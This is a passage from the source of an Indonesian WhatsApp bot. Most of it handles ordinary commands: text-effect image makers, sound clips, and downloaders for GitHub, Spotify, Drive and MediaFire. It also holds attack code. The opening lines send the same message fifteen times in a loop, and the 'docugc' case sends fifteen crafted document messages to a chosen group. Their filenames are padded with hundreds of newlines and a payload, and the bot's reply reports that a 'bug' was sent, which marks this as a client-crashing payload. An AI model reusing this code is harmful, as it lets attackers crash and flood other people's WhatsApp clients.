hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
hinata.sendMessage(from, { image: ppnyauser,  caption: `${buttonkal}` }, { quoted:kalgans })
await sleep(2000)
}
break
//=================================================//
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas': case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike': case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': case 'naruto': case 'batman': case '3dbox': case 'window': case 'bokeh': case 'holographic': case 'thewall': case 'carbon': case 'whitebear': case 'metallic': case 'steel': case 'fabric': case 'ancient': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`*Contoh :* ${prefix+command} ${global.botname}`) 
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
if (/naruto/.test(command)) link = 'https://textpro.me/create-naruto-logo-style-text-effect-online-1125.html'
if (/batman/.test(command)) link = 'https://textpro.me/make-a-batman-logo-online-free-1066.html'
if (/3dbox/.test(command)) link = 'https://textpro.me/3d-box-text-effect-online-880.html'
if (/window/.test(command)) link = 'https://textpro.me/write-text-on-foggy-window-online-free-1015.html'
if (/bokeh/.test(command)) link = 'https://textpro.me/bokeh-text-effect-876.html'
if (/holographic/.test(command)) link = 'https://textpro.me/holographic-3d-text-effect-975.html'
if (/thewall/.test(command)) link = 'https://textpro.me/break-wall-text-effect-871.html'
if (/carbon/.test(command)) link = 'https://textpro.me/carbon-text-effect-833.html'
if (/whitebear/.test(command)) link = 'https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html'
if (/metallic/.test(command)) link = 'https://textpro.me/create-a-metallic-text-effect-free-online-1041.html'
if (/steel/.test(command)) link = 'https://textpro.me/steel-text-effect-online-921.html'
if (/fabric/.test(command)) link = 'https://textpro.me/fabric-text-effect-online-964.html'
if (/ancient/.test(command)) link = 'https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html'
let anu = await maker.textpro(link, q)
hinata.sendMessage(from, { image: { url: anu.image }, caption: `💥 ᴅɪ ʙᴜᴀᴛ ᴏʟᴇʜ ${global.botname}` }, { quoted: m })
}break
//=================================================//
case 'pornhub': case 'retro': case '8bit': case 'lion': case '3davengers': case '3dspace': case 'marvel': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`*Contoh :* ${prefix+command} ɴғs | ᴏғғɪᴄɪᴀʟ`) 
let link
if (/pornhub/.test(command)) link = 'https://textpro.me/pornhub-style-logo-online-generator-free-977.html'
if (/retro/.test(command)) link = 'https://textpro.me/create-3d-retro-text-effect-online-free-1065.html'
if (/8bit/.test(command)) link = 'https://textpro.me/video-game-classic-8-bit-text-effect-1037.html'
if (/lion/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
if (/3davengers/.test(command)) link = 'https://textpro.me/create-3d-avengers-logo-online-974.html'
if (/3dspace/.test(command)) link = 'https://textpro.me/create-space-3d-text-effect-online-985.html'
if (/marvel/.test(command)) link = 'https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html'
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
let anuhub = await maker.textpro(link, [`${teks1}`,`${teks2}`])
hinata.sendMessage(from, { image: { url: anuhub.image }, caption: `💥 ᴅɪ ʙᴜᴀᴛ ᴏʟᴇʜ ${global.botname}` }, { quoted: m })
}break
//=================================================//
case 'glitchtext': case 'writetext': case 'advancedglow': case 'typographytext': case 'pixelglitch': case 'neonglitch': case 'flagtext': case 'flag3dtext': case 'deletingtext': case 'blackpinkstyle': case 'glowingtext': case 'underwatertext': case 'logomaker': case 'cartoonstyle': case 'papercutstyle': case 'watercolortext': case 'effectclouds': case 'blackpinklogo': case 'gradienttext': case 'summerbeach': case 'luxurygold': case 'multicoloredneon': case 'sandsummer': case 'galaxywallpaper': case '1917style': case 'makingneon': case 'royaltext': case 'freecreate': case 'galaxystyle': case 'lighteffects':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`*Contoh :* ${prefix+command} Hinata`) 
let link
if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
if (/writetext/.test(command)) link = 'https://en.ephoto360.com/write-text-on-wet-glass-online-589.html'
if (/advancedglow/.test(command)) link = 'https://en.ephoto360.com/advanced-glow-effects-74.html'
if (/typographytext/.test(command)) link = 'https://en.ephoto360.com/create-typography-text-effect-on-pavement-online-774.html'
if (/pixelglitch/.test(command)) link = 'https://en.ephoto360.com/create-pixel-glitch-text-effect-online-769.html'
if (/neonglitch/.test(command)) link = 'https://en.ephoto360.com/create-impressive-neon-glitch-text-effects-online-768.html'
if (/flagtext/.test(command)) link = 'https://en.ephoto360.com/nigeria-3d-flag-text-effect-online-free-753.html'
if (/flag3dtext/.test(command)) link = 'https://en.ephoto360.com/free-online-american-flag-3d-text-effect-generator-725.html'
if (/deletingtext/.test(command)) link = 'https://en.ephoto360.com/create-eraser-deleting-text-effect-online-717.html'
if (/blackpinkstyle/.test(command)) link = 'https://en.ephoto360.com/online-blackpink-style-logo-maker-effect-711.html'
if (/glowingtext/.test(command)) link = 'https://en.ephoto360.com/create-glowing-text-effects-online-706.html'
if (/underwatertext/.test(command)) link = 'https://en.ephoto360.com/3d-underwater-text-effect-online-682.html'
if (/logomaker/.test(command)) link = 'https://en.ephoto360.com/free-bear-logo-maker-online-673.html'
if (/cartoonstyle/.test(command)) link = 'https://en.ephoto360.com/create-a-cartoon-style-graffiti-text-effect-online-668.html'
if (/papercutstyle/.test(command)) link = 'https://en.ephoto360.com/multicolor-3d-paper-cut-style-text-effect-658.html'
if (/watercolortext/.test(command)) link = 'https://en.ephoto360.com/create-a-watercolor-text-effect-online-655.html'
if (/effectclouds/.test(command)) link = 'https://en.ephoto360.com/write-text-effect-clouds-in-the-sky-online-619.html'
if (/blackpinklogo/.test(command)) link = 'https://en.ephoto360.com/create-blackpink-logo-online-free-607.html'
if (/gradienttext/.test(command)) link = 'https://en.ephoto360.com/create-3d-gradient-text-effect-online-600.html'
if (/summerbeach/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-free-595.html'
if (/luxurygold/.test(command)) link = 'https://en.ephoto360.com/create-a-luxury-gold-text-effect-online-594.html'
if (/multicoloredneon/.test(command)) link = 'https://en.ephoto360.com/create-multicolored-neon-light-signatures-591.html'
if (/sandsummer/.test(command)) link = 'https://en.ephoto360.com/write-in-sand-summer-beach-online-576.html'
if (/galaxywallpaper/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-wallpaper-mobile-online-528.html'
if (/1917style/.test(command)) link = 'https://en.ephoto360.com/1917-style-text-effect-523.html'
if (/makingneon/.test(command)) link = 'https://en.ephoto360.com/making-neon-light-text-effect-with-galaxy-style-521.html'
if (/royaltext/.test(command)) link = 'https://en.ephoto360.com/royal-text-effect-online-free-471.html'
if (/freecreate/.test(command)) link = 'https://en.ephoto360.com/free-create-a-3d-hologram-text-effect-441.html'
if (/galaxystyle/.test(command)) link = 'https://en.ephoto360.com/create-galaxy-style-free-name-logo-438.html'
if (/lighteffects/.test(command)) link = 'https://en.ephoto360.com/create-light-effects-green-neon-online-429.html'
let haldwhd = await ephoto(link, q)
hinata.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
case 'shadow': case 'write': case 'romantic': case 'burnpaper': case 'smoke': case 'narutobanner': case 'love': case 'undergrass': case 'doublelove': case 'coffecup': case 'underwaterocean': case 'smokyneon': case 'starstext': case 'rainboweffect': case 'balloontext': case 'metalliceffect': case 'embroiderytext': case 'flamingtext': case 'stonetext': case 'writeart': case 'summertext': case 'wolfmetaltext': case 'nature3dtext': case 'rosestext': case 'naturetypography': case 'quotesunder': case 'shinetext':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`*Contoh :* ${prefix+command} Hinata`) 
let link
if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
if (/writeart/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-art-quote-on-wood-heart-370.html'
if (/summertext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/3d-summer-text-effect-367.html'
if (/wolfmetaltext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-wolf-metal-text-effect-365.html'
if (/nature3dtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-nature-3d-text-effects-364.html'
if (/rosestext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/yellow-roses-text-360.html'
if (/naturetypography/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-vector-nature-typography-355.html'
if (/quotesunder/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/quotes-under-fall-leaves-347.html'
if (/shinetext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/rainbow-shine-text-223.html'
if (/shadow/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/shadow-text-effect-in-the-sky-394.html'
if (/write/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-the-cup-392.html'
if (/romantic/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/romantic-messages-for-your-loved-one-391.html'
if (/burnpaper/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-text-on-burn-paper-388.html'
if (/smoke/.test(command)) link = 'https://photooxy.com/other-design/create-an-easy-smoke-type-effect-390.html'
if (/narutobanner/.test(command)) link = 'https://photooxy.com/manga-and-anime/make-naruto-banner-online-free-378.html'
if (/love/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-a-picture-of-love-message-377.html'
if (/undergrass/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-quotes-under-grass-376.html'
if (/doublelove/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/love-text-effect-372.html'
if (/coffecup/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/put-any-text-in-to-coffee-cup-371.html'
if (/underwaterocean/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/creating-an-underwater-ocean-363.html'
if (/smokyneon/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/make-smoky-neon-glow-effect-343.html'
if (/starstext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/write-stars-text-on-the-night-sky-200.html'
if (/rainboweffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/glow-rainbow-effect-generator-201.html'
if (/balloontext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/royal-look-text-balloon-effect-173.html'
if (/metalliceffect/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/illuminated-metallic-effect-177.html'
if (/embroiderytext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/create-embroidery-text-online-191.html'
if (/flamingtext/.test(command)) link = 'https://photooxy.com/logo-and-text-effects/realistic-flaming-text-effect-online-197.html'
let dehe = await photooxy.photoOxy(link, q)
hinata.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
hinatagans = await getBuffer(`https://github.com/Blawuken/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await hinata.sendMessage(from, { audio: hinatagans, mimetype: 'audio/mp4', ptt: true, contextInfo:{  externalAdReply: { showAdAttribution: true,
mediaType:  1,
mediaUrl: `https://wa.me/${global.ownernumber}`,
title: `${botname}`,
sourceUrl: `https://wa.me/${global.ownernumber}`,
thumbnail: thumb
}
}})
}break
//=================================================//
case 'public': {
if (!isPrem) return hinatareplyprem() 
hinata.public = true
reply('Bot di stel untuk publik')
}
break
//=================================================//
case 'self': {
if (!isPrem) return hinatareplyprem() 
hinata.public = false
reply('Bot di stel untuk pribadi')
}
break
//=================================================
case 'docugc': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return hinatareplyprem()
if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281xxx`)
bnnd = text.split("|")[0]+'@g.us'
jumlah = "15"
for (let i = 0; i < jumlah; i++) {
var document = generateWAMessageFromContent(from, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `${botname}⏧☆⏧ ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
"caption":` ${botname} ${buttonkal}`,
}
}), { userJid: from, quoted:kalgans})
hinata.relayMessage(bnnd, document.message, { messageId: document.key.id })
}
reply(`*Sukses mengirim Bug Ke ${bnnd} Tolong Jeda 3 Menit Yah*`)
}
break
//=================================================//
case 'gitclone': {
let userh = global.db.data.users[m.sender]
if (userh.registered === false) return HinataReg()
if (!args[0]) return reply(`Di mana tautannya?\n*Contoh :*\n${prefix}${command} https://github.com/Blawuken/NFSMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Tautan tidak valid!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
let [, user, repo] = args[0].match(regex1) || []
repo = repo.replace(/.git$/, '')
let url = `https://api.github.com/repos/${user}/${repo}/zipball`
let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
hinata.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
}
break
//=================================================//
case 'spotify':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!isPrem) return replyprem(mess.premium)
if (!text) return reply(`Di mana tautannya?`)
const Spotify = require('./HinataBase/lib/spotify')
const spotify = new Spotify(text)
const info = await spotify.getInfo()
if ((info).error) return reply(`Tautan yang Anda berikan bukan tautan spotify`)
const { name, artists, album_name, release_date, cover_url } = info
const details = `*Judul:* ${name || ''}\n*Artis:* ${(artists || []).join(
','
)}\n*Album:* ${album_name}\n*Tanggal rilis:* ${release_date || ''}`
const response = await hinata.sendMessage(m.chat, { image: { url: cover_url }, caption: details }, { quoted: m })
const bufferpotify = await spotify.download()
await hinata.sendMessage(m.chat, { audio: bufferpotify }, { quoted: response })
}
break
//=================================================//
case 'happymod':{
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!q) return reply(`📌Contoh : ${prefix+command} Sufway surfer mod`)
const scp1 = require('./HinataBase/lib/scraper')
let kat = await scp1.happymod(q)
reply(util.format(kat))
}
break
//=================================================//
case 'gdrive': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!args[0]) return reply(`📄Masukkan tautan Google Drive`)
try {
let res = await fg.GDriveDl(args[0])
await reply(`
≡ *Google Drive DL*
ミ *Nama:* ${res.fileName}
ミ *Ukuran:* ${res.fileSize}
ミ *Jenis:* ${res.mimetype}`)
hinata.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
} catch {
reply('Error: Periksa tautan atau coba tautan lain') 
}
}
break
//=================================================//
case 'mediafire': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (args.length == 0) return reply(`Di mana tautannya ?`)
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`Tautan yang Anda berikan tidak valid`)
const { mediafireDl } = require('./HinataBase/lib/mediafire.js')
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return reply('Ups, file terlalu besar...')
const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Nama* : ${baby1[0].nama}
*❖ Ukuran* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
reply(`${result4}`)
hinata.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}break
//=================================================//
case 'sfilemobisearch': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} GTA`)
try {
let res = await fg.sfileSearch(text)
let teks = '「🔖𝗦𝗳𝗶𝗹𝗲𝗠𝗼𝗯𝗶 𝗦𝗲𝗮𝗿𝗰𝗵🔖」\n\n🔎 Penelusuran *'+text+'*\n▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄\n'
let no = 1
for (let i of res) {
teks += `📌𝗡𝗼 : ${no++}\n📝𝗡𝗮𝗺𝗮 : ${i.title}\n⚖️𝗨𝗸𝘂𝗿𝗮𝗻 : ${i.size}\n📎𝗨𝗿𝗹 : ${i.link}\n▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄\n`
}
reply(teks)
} catch {
m.reply('Tidak di temukan 🚫') 
}
}break
//=================================================//
case 'ytsearch': {
let user = global.db.data.users[m.sender]
if (user.registered === false) return HinataReg()
if (!text) return reply(`📌Contoh : ${prefix + command} Sido Rondo`)
let yts = require("yt-search")
let search = await yts(text)
